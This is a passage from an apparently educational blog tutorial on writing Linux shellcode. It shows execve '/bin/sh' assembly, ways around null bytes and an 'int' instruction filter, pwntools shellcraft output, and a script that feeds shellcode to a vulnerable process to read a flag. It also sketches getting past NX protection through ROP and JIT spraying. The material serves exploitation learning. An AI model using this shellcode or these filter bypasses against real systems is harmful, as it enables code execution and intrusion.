    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span><span class="mh">0x68732f2f6e69622f</span>
    <span class="nf">push</span> <span class="nb">rdi</span>
    <span class="nf">push</span> <span class="nb">rsp</span>
    <span class="nf">pop</span> <span class="nb">rdi</span>
    <span class="nf">push</span> <span class="mi">59</span>
    <span class="nf">pop</span> <span class="nb">rax</span>
    <span class="nf">cdq</span>
    <span class="nf">int</span>  <span class="c1">; new instruction added</span>
    <span class="nf">syscall</span>
</pre></table></code></div></div><p>In this example, we set a breakpoint just before the syscall so we can check that all our registers are set as we want. But we can also use GDB to send the shellcode, like this:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gdb ./vulnerable
<span class="go">(gdb) r &lt; shellcode
</span></pre></table></code></div></div><p><br /></p><hr /><h2 id="forbidden-smithing"><span class="mr-2">Forbidden Smithing</span><a href="#forbidden-smithing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There are certain bytes that can cause issues in our shellcodes, such as null bytes, new lines, spaces, etc. For example:</p><div class="table-wrapper"><table><thead><tr><th><strong>Byte</strong><th><strong>Method</strong><tbody><tr><td>Null byte \0 (<code class="language-plaintext highlighter-rouge">0x00</code>)<td>strcpy<tr><td>Newline \n (<code class="language-plaintext highlighter-rouge">0x0a</code>)<td>scanf gets getline fgets<tr><td>Carriage return \r (<code class="language-plaintext highlighter-rouge">0x0d</code>)<td>scanf<tr><td>Space (<code class="language-plaintext highlighter-rouge">0x20</code>)<td>scanf<tr><td>Tab \t (<code class="language-plaintext highlighter-rouge">0x09</code>)<td>scanf<tr><td>DEL (<code class="language-plaintext highlighter-rouge">0x7f</code>)<td>protocol-specific</table></div><p>However, there are many other forbidden bytes that we may not know of, which can cause our shellcode to fail. To address this issue, we can manually identify such forbidden bytes and find ways to work around them.</p><h3 id="null-bytes"><span class="mr-2">Null Bytes</span><a href="#null-bytes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>For example, if we need to zero out a register, we can use the <code class="language-plaintext highlighter-rouge">mov</code> instruction, but its opcode will contain multiple null bytes.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>
</pre></table></code></div></div><p>To avoid this, we can use alternative instructions such as <code class="language-plaintext highlighter-rouge">xor</code> to achieve the same result of zeroing the register.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span><span class="nb">rax</span>
</pre></table></code></div></div><p>And without using 0, we have zeroed the register. We have an infinite number of possibilities here.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span><span class="mi">5</span>
</pre></table></code></div></div><p>For example, instead of simply adding 5, we can use some unconventional techniques such as:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span><span class="nb">rax</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mi">5</span>
</pre></table></code></div></div><h3 id="instructions-filters"><span class="mr-2">Instructions Filters</span><a href="#instructions-filters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>But what happens if an instruction itself is blocked, such as <code class="language-plaintext highlighter-rouge">int</code> instruction that is used for making syscalls in our shellcode? We can bypass such instruction filters by modifying the instruction to execute a similar functionality. For instance, we can add 0x01 to the hex value of <code class="language-plaintext highlighter-rouge">int</code> (0xcc) to create a new instruction and execute it:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">inc</span> <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">rip</span><span class="p">]</span>
<span class="nf">.byte</span> <span class="mh">0xcb</span>
</pre></table></code></div></div><p>With this modification, the filter for <code class="language-plaintext highlighter-rouge">int</code> is bypassed, and we can make syscalls in our shellcode.</p><p><br /></p><hr /><h2 id="possible-issues"><span class="mr-2">Possible Issues</span><a href="#possible-issues" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Forbidden bytes or instructions are not the only obstacles that we may face when shellcoding. We can also encounter a variety of problems with ambiguous or unspecified sizes, such as:</p><div class="table-wrapper"><table><thead><tr><th><strong>Size</strong><th><strong>Ambiguity</strong><th><strong>Unambiguity</strong><tbody><tr><td>Single byte<td><code class="language-plaintext highlighter-rouge">mov [rax], bl</code><td><code class="language-plaintext highlighter-rouge">mov BYTE PTR [rax], 5</code><tr><td>2-byte word<td><code class="language-plaintext highlighter-rouge">mov [rax], bx</code><td><code class="language-plaintext highlighter-rouge">mov WORD PTR [rax], 5</code><tr><td>4-byte dword<td><code class="language-plaintext highlighter-rouge">mov [rax], ebx</code><td><code class="language-plaintext highlighter-rouge">mov DWORD PTR [rax], 5</code><tr><td>8-byte qword<td><code class="language-plaintext highlighter-rouge">mov [rax], rbx</code><td><code class="language-plaintext highlighter-rouge">mov QWORD PTR [rax], 5</code></table></div><p>However, the list of potential issues doesn’t end there. Shellcode can encounter a variety of issues depending on the specific program it’s running on, such as:</p><ul><li>Sorting<li>Compression/Decompression<li>Encryption/Decryption<li>Serialization/Deserialization</ul><p>Additionally, not every program allows us to spawn a shell and receive its output. In those cases, we may need to find alternative ways to work with the output, such as writing it to a file or modifying system files. As you can see, the possibilities are endless and limited only by your imagination.</p><p><br /></p><hr /><h2 id="cross-architecture-forging"><span class="mr-2">Cross-Architecture Forging</span><a href="#cross-architecture-forging" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>While I mentioned earlier that I lack the knowledge to cover other architectures in-depth, I can provide some instructions on how to compile shellcodes for different architectures, in case anyone is interested:</p><div class="table-wrapper"><table><thead><tr><th><strong>Arch</strong><th><strong>Command</strong><tbody><tr><td>x86_32<td><code class="language-plaintext highlighter-rouge">gcc -m32 -nostdlib -static shellcode.s -o shellcode</code><tr><td>amd64<td><code class="language-plaintext highlighter-rouge">gcc -nostdlib -static shellcode.s -o shellcode</code><tr><td>mips<td><code class="language-plaintext highlighter-rouge">mips-linux-gnu-gcc -nostdlib shellcode.s -o shellcode</code><tr><td>arm64<td><code class="language-plaintext highlighter-rouge">aarch64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode</code><tr><td>armv7<td><code class="language-plaintext highlighter-rouge">arm-linux-gnueabi-gcc -nostdlib -static shellcode.s -o shellcode</code><tr><td>powerpc64<td><code class="language-plaintext highlighter-rouge">powerpc64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode</code><tr><td>sparc64<td><code class="language-plaintext highlighter-rouge">sparc64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode</code><tr><td>riscv64<td><code class="language-plaintext highlighter-rouge">riscv64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode</code></table></div><blockquote class="prompt-warning"><p>Remember that the exact command may vary depending on your specific setup and environment, and you may need to install additional libraries or dependencies for the compilation to work properly.</p></blockquote><p>Additionally, it’s worth noting that the process of crafting shellcodes for both 32-bit and 64-bit systems is similar. I focused on 64-bit systems in this guide as they are more commonly used nowadays, but knowing how to craft shellcodes for 64-bit systems can also help with crafting them for 32-bit systems.</p><p><br /></p><hr /><h2 id="hire-a-blacksmith"><span class="mr-2">Hire a Blacksmith</span><a href="#hire-a-blacksmith" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Sometimes, shellcoding can be a difficult process to achieve. That’s why we can use shellcode generators to help ourselves out. But before using these tools, we need to understand the <em>forging</em> of shellcodes so that we know what code is generated and how we can modify it if needed. These tools typically avoid common forbidden bytes, such as null bytes or newlines. However, programs can have their own forbidden bytes. Therefore, it’s important to understand our code so that we can modify it.</p><p>So, what tool should we use for shellcode generation? Obviously, pwntools. This library has a <code class="language-plaintext highlighter-rouge">shellcraft</code> class with MANY different shellcodes already prepared. For example, here’s how you can generate a simple shell spawn:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nf">print</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
    <span class="o">/*</span> <span class="nf">execve</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="sh">'</span><span class="s">/bin///sh</span><span class="sh">'</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">sh</span><span class="sh">'</span><span class="p">],</span> <span class="n">envp</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin///sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x68</span>
    <span class="n">push</span> <span class="mh">0x732f2f2f</span>
    <span class="n">push</span> <span class="mh">0x6e69622f</span>
    <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="n">argument</span> <span class="n">array</span> <span class="p">[</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">]</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="sh">'</span><span class="s">sh</span><span class="se">\x00\x00</span><span class="sh">'</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x1010101</span>
    <span class="n">xor</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mh">0x1016972</span>
    <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
    <span class="n">push</span> <span class="n">ecx</span> <span class="o">/*</span> <span class="n">null</span> <span class="n">terminate</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mi">4</span>
    <span class="n">pop</span> <span class="n">ecx</span>
    <span class="n">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>
    <span class="n">push</span> <span class="n">ecx</span> <span class="o">/*</span> <span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*/</span>
    <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>
    <span class="n">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
    <span class="o">/*</span> <span class="n">call</span> <span class="nf">execve</span><span class="p">()</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="n">SYS_execve</span> <span class="o">/*</span> <span class="mh">0xb</span> <span class="o">*/</span>
    <span class="n">pop</span> <span class="n">eax</span>
    <span class="nb">int</span> <span class="mh">0x80</span>
</pre></table></code></div></div><p>You can even use pwntools to generate the shellcode and convert it to opcodes for you. Here’s an example of a script that generates a shellcode to print a flag:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="sh">"</span><span class="s">linux</span><span class="sh">"</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">/vulnerable</span><span class="sh">"</span><span class="p">)</span>

<span class="nb">file</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">cat</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>This script generates the shellcode, converts it to opcodes, and sends it to a running process.</p><p><br /></p><hr /><h2 id="final-challenge"><span class="mr-2">Final Challenge</span><a href="#final-challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s get real for the end. Shellcoding may seem cool, but it is nearly dead. Modern systems implement the <strong>NX</strong> (<strong>N</strong>o e<strong>X</strong>ecute Byte), which removes the stack and heap executable property. In fact, there are three memory permissions (<code class="language-plaintext highlighter-rouge">PROT_READ</code>, <code class="language-plaintext highlighter-rouge">PROT_WRITE</code>, and <code class="language-plaintext highlighter-rouge">PROT_EXEC</code>), and a segment will not (typically) be writable and executable at the same time. The code of the program is usually allocated at the <code class="language-plaintext highlighter-rouge">.text</code> segment, which is readable and executable. Why would a program need another segment to be executable?</p><p>So, is this the end of shellcoding? Well, not quite yet.</p><h3 id="de-protecting-memory"><span class="mr-2">De-Protecting Memory</span><a href="#de-protecting-memory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If the memory is protected, why not revoke these protections? If we are able to call the <code class="language-plaintext highlighter-rouge">mprotect(PROT_EXEC)</code> function to our shellcode, we can make it executable. Easy, right? As you can guess, finding it is not as easy as it sounds. We can’t execute code, so we need that function to already be present in our program, and call it through <strong>ROP</strong> (<strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming). So this is not a 100% reliable method.</p><h3 id="jit"><span class="mr-2">JIT</span><a href="#jit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <strong>Just In Time Compilation</strong> is present in programs that need to recompile themselves frequently, changing the code during execution. Because programs don’t have a writable-executable segment, they change the permissions during execution. It can be done like this:</p><ul><li><code class="language-plaintext highlighter-rouge">mmap(PROT_READ|PROT_WRITE)</code><li>write the code<li><code class="language-plaintext highlighter-rouge">mmap(PROT_READ|PROT_EXEC)</code><li>execute<li><code class="language-plaintext highlighter-rouge">mmap(PROT_READ|PROT_WRITE)</code><li>update code<li>…</ul><p>However, we run into another problem. System calls are <strong>slow</strong> and JIT is <strong>fast</strong>, so we don’t have time to inject our shellcode into that space. Thankfully, we have two options here:</p><h4 id="jit-spraying"><span class="mr-2">JIT Spraying</span><a href="#jit-spraying" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>If we find and overwrite some variables that JIT will write, we can inject our shellcode into an executable segment. But then, we need to chain with another vulnerability that allows us to jump to the shellcode.</p><p>It may sound difficult to achieve, but JIT is present in many software, such as Java, browsers, and many interpreted language runtimes. So the attack surface increases quickly.</p><h4 id="libraries"><span class="mr-2">Libraries</span><a href="#libraries" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The other option is to aim for libraries. They tend to have writable-executable pages, and if our program uses them, we will have a writable-executable page in memory that we can use.</p><p><br /></p><hr /><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://pwn.college/">Pwn College</a><li><a href="https://papers.vx-underground.org/papers/Linux/Process%20Injection/2013-02-10%20-%20Shellcoding%20in%20Linux.pdf">VXU Papers</a><li><a href="https://cocomelonc.github.io/">Cocomelonc Blog</a><li><a href="http://www.phrack.com/issues/49/14.html">Smashing the Stack</a></ul><p><br /></p><hr /><h2 id="footnotes"><span class="mr-2">Footnotes</span><a href="#footnotes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:footnote" role="doc-endnote"><p>Memory paging is an operating system memory management technique that divides a computer’s primary memory into smaller parts, called pages. <a href="#fnref:footnote" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:fn-nth-2" role="doc-endnote"><p>These are special routines that halt the software execution, usually to switch between userland and kernelspace. <a href="#fnref:fn-nth-2" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:fn-nth-3" role="doc-endnote"><p>Opcode is the portion of a machine language instruction that specifies the operation to be performed. <a href="#fnref:fn-nth-3" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/sensei/'>Sensei</a>, <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lowlevel/" class="post-tag no-text-decoration" >lowlevel</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=The%20Shellcode%20Blacksmith%20%7C%20Sensei%20-%20Zeropio's%20Dojo&url=https%3A%2F%2Fzeropio.ninja%2F%2Fsensei%2Fshellcode-blacksmith" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=The%20Shellcode%20Blacksmith%20%7C%20Sensei%20-%20Zeropio's%20Dojo&u=https%3A%2F%2Fzeropio.ninja%2F%2Fsensei%2Fshellcode-blacksmith" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fzeropio.ninja%2F%2Fsensei%2Fshellcode-blacksmith&text=The%20Shellcode%20Blacksmith%20%7C%20Sensei%20-%20Zeropio's%20Dojo" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/index">Index</a><li><a href="/sensei/shellcode-blacksmith">The Shellcode Blacksmith | Sensei</a><li><a href="/lowlevel/osdev/chapter-0">OSDev | Chapter 0 | Basic Kernel</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/lowlevel/">lowlevel</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/osdev/">osdev</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/reversing/">reversing</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/malware/development/putty-1"><div class="card-body"> <em class="small" data-ts="1674946800" data-df="ll" > Jan 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MalDev | Putty</h3><div class="text-muted small"><p> Enumeration First, debug a 32bit putty.exe in x32dbg. There is a inital breakpoint in the binary: Address=00454AD0 Module/Label/Exception=&amp;lt;putty.exe.EntryPoint&amp;gt; State=One-time Disassembly=pu...</p></div></div></a></div><div class="card"> <a href="/malware/development/dropper-explorer-1"><div class="card-body"> <em class="small" data-ts="1675206000" data-df="ll" > Feb 1, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MalDev | Dropper Explorer.exe</h3><div class="text-muted small"><p> From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python scrip...</p></div></div></a></div><div class="card"> <a href="/lowlevel/osdev/chapter-0"><div class="card-body"> <em class="small" data-ts="1681336800" data-df="ll" > Apr 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OSDev | Chapter 0 | Basic Kernel</h3><div class="text-muted small"><p> Introduction This series, is a personal project focused on learning more about ASM, kernel development, computer basics, and Rust. This is not a professional blog, and I will be using resources fr...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/lowlevel/osdev/chapter-4" class="btn btn-outline-primary" prompt="Older"><p>OSDev | Chapter 4 | Memory Management</p></a> <a href="/research/rustversing/part-1" class="btn btn-outline-primary" prompt="Newer"><p>Reversing Rust 1 | Research</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/lowlevel/">lowlevel</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/osdev/">osdev</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/reversing/">reversing</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ZeropioWasTaken">zeropio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
